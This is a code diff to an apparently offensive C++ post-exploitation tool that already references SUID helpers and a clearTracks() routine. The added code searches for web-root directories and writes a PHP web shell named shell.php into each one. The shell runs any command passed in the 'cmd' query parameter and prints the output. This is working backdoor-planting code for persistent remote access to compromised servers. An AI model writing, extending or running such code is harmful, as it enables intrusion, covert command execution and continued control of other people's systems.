@@ -1,4 +1,6 @@
+#include <filesystem>
 #include <iostream>
+#include <fstream>
 #include "core/init.h"
 #include "modules/executils.h"
 #include "tools/suids.h"
@@ -70,5 +72,27 @@ int main() {
 
     clearTracks();
 
+    // Find www directory so we can drop a reverse shell
+    std::string phpShell = R"(
+        <?php
+        if (isset($_GET['cmd'])) {
+            $cmd = $_GET['cmd'];
+            echo "<pre>" . shell_exec($cmd) . "</pre>";
+        }
+        ?>
+        )";
+    auto files = wwwDir();
+    for (const auto& dir : files) {
+        std::cout << "Found directory: " << dir << "\n";
+        std::string shellPath = dir + "/shell.php";
+        std::ofstream outFile(shellPath);
+        outFile << phpShell;
+        outFile.close();
+        if (std::filesystem::exists(shellPath)) {
+            std::cout << GREEN << "shell.php created!" << "\n";
+        } else {
+            std::cout << RED << "shell.php wasn't created" << "\n";
+        }
+    }
     return 0;
 }
